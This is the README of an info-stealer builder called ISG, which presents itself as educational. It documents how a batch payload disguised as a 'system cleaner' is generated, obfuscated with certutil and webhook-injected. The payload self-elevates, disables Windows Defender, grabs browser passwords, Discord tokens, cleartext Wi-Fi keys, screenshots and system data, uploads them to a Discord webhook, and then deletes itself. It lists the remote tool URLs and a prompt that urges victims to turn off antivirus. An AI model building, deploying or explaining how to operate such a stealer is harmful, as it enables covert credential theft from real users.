# ISG — Info Stealer Generator

> [!WARNING]
> **Educational / authorized-testing use only.**
> ISG generates a batch payload that collects credentials and personal data from a Windows machine and uploads it to a Discord webhook. Running it against a system you do not own, or do not have explicit written permission to test, is illegal in most jurisdictions. You are responsible for how you use this code. The author accepts no liability for misuse or damage.

ISG is a two-stage tool:

1. **`isg.bat`** — an interactive builder that bakes a webhook into a payload template, obfuscates it and drops the result in `%USERPROFILE%\Downloads`.
2. **`isgen.txt`** — the payload template (the generated script is named `SCleaner.bat` and presents itself as a "system cleaner").

The generated script is self-contained apart from a handful of files it downloads at runtime.

---

## Repository layout

| File | Purpose |
| --- | --- |
| `isg.bat` | Generator / builder UI. Validates the webhook, composes the payload, obfuscates it, and moves it to Downloads. |
| `isgen.txt` | Payload template. Concatenated verbatim into `%TEMP%\SCleaner.bat` before the webhook is injected. |
| `bfo.bat` | Bundled batch obfuscator used by the builder. Wraps the payload with a `certutil`-decoded stub and writes `<name>___.bat`. |
| `README.md` | This file. |

`isgen2.txt` no longer exists — it was merged into `isgen.txt` in the v1.3 update.

---

## Quick start

```bat
isg.bat
```

The builder then asks for a Discord webhook URL. Paste it and press Enter. When it finishes, the payload is at:

```
%USERPROFILE%\Downloads\SCleaner.bat
```

You can also pass the webhook non-interactively, which skips the prompt and the final pause:

```bat
isg.bat "https://discord.com/api/webhooks/..."
```

This argument form is intended for scripted builds.

### Builder requirements

- Windows 10/11
- `powershell` on `PATH` (used to download a missing template and to substitute the webhook)
- `certutil.exe` on `PATH` (used by the bundled `bfo.bat`; present on all supported Windows versions)

`bfo.bat` ships next to the generator and is resolved automatically because `isg.bat` changes into its own directory first. If it is deleted, the builder still prints a success message but no obfuscated `SCleaner___.bat` is produced, so the `ren`/`move` steps silently fail.

---

## How it works

### Stage 1 — build (`isg.bat`)

```text
isg.bat
 ├─ if isgen.txt is missing, download it from this repository
 ├─ copy isgen.txt          -> %TEMP%\SCleaner.bat
 ├─ replace your_webhook_url_here1 with the supplied webhook
 ├─ run bundled bfo.bat     -> SCleaner___.bat
 ├─ delete the plaintext %TEMP%\SCleaner.bat
 ├─ rename SCleaner___.bat  -> SCleaner.bat
 └─ move to %USERPROFILE%\Downloads\SCleaner.bat
```

Notes:

- An existing `%TEMP%\SCleaner.bat` is deleted first.
- The generator changes into its own directory (`cd /d "%~dp0"`), so `isgen.txt`, `bfo.bat` and an optional `logo.bat` are resolved relative to `isg.bat`.
- If a `logo.bat` exists next to the generator it is called for branding; otherwise the step is skipped. This is what lets `isg.bat` run standalone, outside the original multitool.
- `bfo.bat` validates that its argument is a `.bat`/`.cmd`, decodes a tiny `certutil` stub and prepends it to the script, producing `<name>___.bat` in the current directory. The builder then renames that file back to `SCleaner.bat`.

### Stage 2 — execution (`SCleaner.bat`)

```text
fltmc check ──► not elevated ──► relaunch via PowerShell Start -Verb RunAs
                     │                    └─ if elevation fails: continue as elevated=false
                     └─ elevated ──► elevated=true

prep (%TEMP%\wstemp, SCleaner.log)
  └─ Windows version gate (ver >= 10) ──► fail: delete self, exit

compatible
  ├─ [not elevated] show AV warning, require typing "I UNDERSTAND"
  ├─ download 7z.exe / 7z.dll
  ├─ [elevated] download WinDefCtl, kill Defender
  ├─ collect local/public IP, send "connection established"
  ├─ screenshot -> upload
  ├─ collect system / network / filesystem / Wi-Fi data
  ├─ run zipping.ps1 -> info.zip -> upload
  ├─ run WebBrowserPassView -> passwords.zip -> upload
  ├─ run discord_token.py on a bundled Python -> Discord data
  ├─ [elevated] restore Defender
  ├─ upload SCleaner.log
  └─ delete %TEMP%\wstemp and self-delete
```

---

## What the payload collects

| Category | Details |
| --- | --- |
| Identity | `%USERNAME%`, `%COMPUTERNAME%`, local IP (`ping`), public IP (`api.ipify.org`) |
| System | `ver`, `systeminfo`, `fastfetch` output, Windows product key (`BackupProductKeyDefault`), `tasklist`, `netstat -an` |
| Filesystem | Directory listings of the working directory, `C:\Program Files`, Documents and Desktop |
| Network | `ipconfig`, all Wi-Fi profiles exported with `key=clear` (SSIDs + cleartext keys) |
| Screen | Desktop screenshot (PNG) |
| Credentials | Saved browser passwords (WebBrowserPassView), Discord tokens (`discord_token.py`) |
| Log | Timestamped `%TEMP%\SCleaner.log` documenting every stage |

Results are sent as **separate Discord messages**: a connection summary, the screenshot, `info.zip`, `passwords.zip`, and finally the log. This keeps each message small and makes failures easier to isolate.

---

## Webhook injection

`isgen.txt` contains the literal placeholder:

```bat
set webhook=your_webhook_url_here1
```

The builder rewrites only the first occurrence in the assembled script:

```powershell
(Get-Content '%TEMP%\SCleaner.bat') -replace 'your_webhook_url_here1', '<webhook>' | Set-Content '%TEMP%\SCleaner.bat'
```

The Discord token grabber uses a second placeholder, `your_webhook_url_here`, which is replaced inside the downloaded `updates.py` at runtime.

Because the webhook is injected *before* obfuscation, the generated payload contains the URL in obfuscated form only.

---

## Obfuscation (`bfo.bat`)

`bfo.bat` is a small self-contained wrapper around `certutil`:

```text
input.bat
 ├─ validate the argument and its .bat/.cmd extension
 ├─ certutil -decode a hardcoded base64 stub
 ├─ write <name>___.bat
 └─ copy /b <name>___.bat + input.bat   (prepend the stub)
```

The decoded stub is a UTF-16 BOM followed by `&cls`, which suppresses the leading command echo when the payload starts. The builder consumes `<name>___.bat`, deletes the plaintext `%TEMP%` copy and renames the output back to `SCleaner.bat`, so the delivered script is the obfuscated one.

---

## External dependencies and endpoints

Everything below is fetched at runtime by the generated payload:

| Source | Used for |
| --- | --- |
| `api.ipify.org` | Public IP lookup |
| `raw.githubusercontent.com/SchooiCodes/isgen/.../isgen.txt` | Template fallback for the builder |
| `github.com/LargeVanillaMilkshake/1a/.../7z.exe`, `7z.dll` | Archive extraction |
| `.../fastfetch.exe` | System summary |
| `.../zipping.ps1` | Builds `info.zip` |
| `.../passreccommandline.zip` | Contains `WebBrowserPassView.exe` |
| `.../python-3.14.7-embed-amd64.zip` | Preconfigured embeddable Python |
| `.../discord_token.py` | Discord token grabber |
| `github.com/wesmar/WinDefCtl/releases/.../v2.0.0/WinDefCtl.7z` | Defender control utility (password `github.com`) |
| `raw.githubusercontent.com/npocmaka/batch.scripts/.../screenCapture.bat` | Screenshot helper |
| Your Discord webhook | All uploads |

A working internet connection and `curl.exe` (included with Windows 10 1803+) are required.

---

## Elevation and Defender handling

- The payload checks for elevation with `fltmc`. If not elevated, it attempts to relaunch itself with `PowerShell Start -Verb RunAs`.
- If elevation is declined or unavailable, it sets `elevated=false` and continues in a reduced mode instead of aborting.
- **Elevated:** it downloads WinDefCtl v2.0.0, runs `WinDefCtl kill` before collection, then `WinDefCtl restore` afterwards.
- **Not elevated:** the WinDefCtl stage is skipped and the user is asked to disable antivirus manually before collection starts. This is the only path that shows the "pure false positives" warning screen.

## Cleanup

- `%TEMP%\wstemp` (staging, extracted tools, collected data) is deleted at the end.
- The downloaded 7z binaries, `fastfetch.exe`, WinDefCtl archive and extracted folder are removed.
- `SCleaner.log` is kept only long enough to be uploaded.
- The payload deletes itself with `del "%~f0"` on both the success and incompatible-OS paths.

---

## Requirements and compatibility

- Windows 10 or 11 (`ver` must report 10 or newer).
- PowerShell 5.1+.
- `curl.exe` (Windows 10 1803+).
- Administrative rights for the full feature set; the script degrades gracefully without them.
- The payload is a `.bat` file, so `cmd.exe` policy, AppLocker/WDAC rules and antivirus heuristics all apply.

## Known limitations / gotchas

- `bfo.bat` is bundled, but it relies on `certutil.exe` and exits silently for non-`.bat`/`.cmd` inputs.
- The builder prefers a local `isgen.txt` and only falls back to the copy in this repository when it is absent, so a stale local template can shadow upstream changes.
- `bfo.bat` writes `SCleaner___.bat` into the current directory before the builder renames and moves it; a locked or read-only working directory breaks generation.
- All download URLs and the WinDefCtl version/password are hardcoded in `isgen.txt`; moving or renaming those remote assets breaks the payload.
- The Python stage assumes the embeddable distribution extracts to `%TEMP%\wstemp\py\` and that `python.exe` is at its root.
- `setlocal enabledelayedexpansion` is enabled but most variables are still expanded eagerly with `%VAR%`.
- One log line prints a literal `%windowsver%` because of a quoting slip in `echo [%TIME%] %%windowsver%%`.
- The script intentionally passes `curl -k`, disabling TLS certificate validation for webhook uploads.
- If Discord rate-limits or rejects a webhook, uploads fail silently (`>nul`); only the local log records progress.
- Antivirus products commonly flag both the generator and the payload; there is no packing or signature evasion beyond `bfo`.

---

## Project history (current files)

| Version | Change |
| --- | --- |
| v1.2 | Split payload into `isgen.txt` + `isgen2.txt`, assembled by the builder |
| — | Automatic template download, TLS 1.2 enforcement, Wi-Fi export fix |
| — | Obfuscation via `bfo`, added task list / directory / fastfetch collection |
| — | Discord token stealing, CLI webhook argument, registry license key read |
| — | Browser password theft with WebBrowserPassView, SCleaner rebrand |
| v1.3 | `isgen2.txt` merged into `isgen.txt`; AV warning gate; embeddable Python |
| — | Detailed `SCleaner.log` logging and log upload |
| — | Results split into separate webhook messages |
| — | Self-elevation, WinDefCtl kill/restore, legal notice |
| — | Standalone repo: bundled `bfo.bat`, template fallback points here, README added |

---

## Legal

This project is provided for education, malware analysis and authorized red-team exercises. Do not use it to access systems or data you do not own. Depending on your jurisdiction, possession or use of this tool may itself be an offence.
